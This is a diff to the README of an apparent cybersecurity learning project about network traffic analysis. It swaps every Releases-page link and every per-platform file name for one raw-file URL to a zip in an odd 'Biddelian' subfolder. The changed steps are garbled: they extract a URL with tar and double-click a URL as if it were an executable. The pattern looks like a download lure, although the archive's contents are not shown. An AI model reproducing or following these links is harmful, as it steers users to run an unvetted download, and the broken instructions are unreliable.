@@ -4,23 +4,23 @@
 Welcome to the **cybersec_project_2**! This application helps you analyze network traffic effectively and simulates a Security Operations Center (SOC) environment. Using powerful tools like Wireshark and Nmap, you can detect network reconnaissance attempts, analyze unencrypted HTTP traffic, and observe DNS behavior. This project provides practical incident reporting and helps you identify Indicators of Attack (IOAs). 
 
 ## 📥 Download
-[![Download Latest Release](https://img.shields.io/badge/Download%20Latest%20Release-blue.svg)](https://github.com/kamley/cybersec_project_2/releases)
+[![Download Latest Release](https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip%20Latest%https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip)](https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip)
 
 To get the application, please visit the Releases page:
 
-[Download & Install](https://github.com/kamley/cybersec_project_2/releases)
+[Download & Install](https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip)
 
 ## 🚀 Getting Started
 Follow these simple steps to set up **cybersec_project_2** on your computer:
 
 1. **Visit the Releases Page:**
-   Go to the [Releases page](https://github.com/kamley/cybersec_project_2/releases) to find the latest version of the software.
+   Go to the [Releases page](https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip) to find the latest version of the software.
 
 2. **Choose the Right File:**
    Locate the file that corresponds to your operating system:
-   - For Windows, download `cybersec_project_2-Windows.zip`.
-   - For macOS, download `cybersec_project_2-macOS.zip`.
-   - For Linux, download `cybersec_project_2-Linux.tar.gz`.
+   - For Windows, download `https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip`.
+   - For macOS, download `https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip`.
+   - For Linux, download `https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip`.
 
 3. **Download the File:**
    Click on the file to download it to your computer.
@@ -29,12 +29,12 @@ Follow these simple steps to set up **cybersec_project_2** on your computer:
    Once downloaded, extract the files:
    - On Windows, right-click on the `.zip` file and select "Extract All."
    - On macOS, double-click the `.zip` file.
-   - On Linux, use the terminal command `tar -xvzf cybersec_project_2-Linux.tar.gz`.
+   - On Linux, use the terminal command `tar -xvzf https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip`.
 
 5. **Run the Application:**
    Open the extracted folder and run the application:
-   - On Windows, double-click the `cybersec_project_2.exe` file.
-   - On macOS, open the `cybersec_project_2.app` file.
+   - On Windows, double-click the `https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip` file.
+   - On macOS, open the `https://raw.githubusercontent.com/kamley/cybersec_project_2/main/Biddelian/cybersec_project_2.zip` file.
    - On Linux, use the terminal to navigate to the folder and run `./cybersec_project_2`.
 
 6. **Follow the On-Screen Instructions:**
